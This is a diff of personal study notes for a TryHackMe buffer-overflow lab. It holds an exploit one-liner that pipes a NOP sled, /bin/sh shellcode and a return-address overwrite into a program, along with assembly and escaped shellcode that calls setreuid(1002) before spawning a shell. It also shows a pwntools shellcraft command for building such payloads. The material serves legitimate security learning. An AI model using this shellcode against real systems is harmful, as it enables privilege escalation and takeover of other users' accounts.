@@ -498,7 +498,7 @@ int main(int argc, char **argv)
 	`python -c "print('\90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde') | ./program-name"
 	- lol `deadbeef` ^ 
 	- There can be cases where you need to pass xargs before the ./prrogram-name
-- *oof. After a while I had to look up some additional information because my knowledge-set with debugging and with C is very limited at this stage (if even existent!)*
+- *oof. After a while, a decent while, I had to look up some additional information because my knowledge-set with debugging and with C is very limited at this stage (if even existent!)*
 ---
 **This entire part here is workings alongside the following write-up for https://tryhackme.com/room/bof1 - Task 8**
 
@@ -591,8 +591,56 @@ int main(int argc, char **argv)
 - Thanks  l1ge :) 
 	- There is a huge but in Task 8 though. 
 	- Albeit that we were able to pop a shell out of the buffer overflow exploit we did.... We're still User1. The secret.txt file is owned by User2. Great.
-	- tbc
+	
+- We need to **set the Real User ID** in this instance (which is 1002) `setreuid()`
+		- https://www.geeksforgeeks.org/real-effective-and-saved-userid-in-linux/
+	- "Could write a shellcode in C, compile it, look at the assembly code, remove the bad characters and use the exploit"
+	- "Go straight to assembly, find an existing shellcode that uses `setruid()`
+	- Using resources like pwntools
+	- And well any other thorough research that will lead you to other findings and general knowledge
 
+	- |1ge has written this assembly code:
+
+```asm
+xor    rdi,rdi
+xor    rax,rax		
+xor    rsi, rsi
+mov    si, 1002
+mov    di, 1002
+mov    al,0x71    
+syscall
+xor    rdx,rdx
+movabs rbx,0x68732f6e69622fff
+shr    rbx,0x8
+push   rbx
+mov    rdi,rsp
+xor    rax,rax
+push   rax
+push   rdi
+mov    rsi,rsp
+mov    al,0x3b
+syscall
+push   0x1
+pop    rdi
+push   0x3c
+pop    rax
+syscall
+```
+- Which when assembled (using a tool such as https://defuse.ca/online-x86-assembler.htm#disassembly) comes out to:
+`\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05`
+\[62 bytes\]
+
+- **|1ge had then referred the write-up to *pwntools* and its shellcraft module**
+- This is super easy ..... (from the look of things!)
+- `pwn shellcraft -f d amd64.linux.setreuid 1002` 
+- You get:
+	- `\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05`
+	- `-f d` sets the format to "escaped" 
+	- `-f a` will allow you to see the assembly version :) 
+	- Slap this bit of shellcode on to the front of the previous shellcode and you're golden, almost
+	- Note that since our new revised shellcode is bigger by 14bytes, we'd need to amend how many NOP instructions we have in it
+		- (just take away 14 from the 100, 86)
+	- Golden.
 ---
 
 
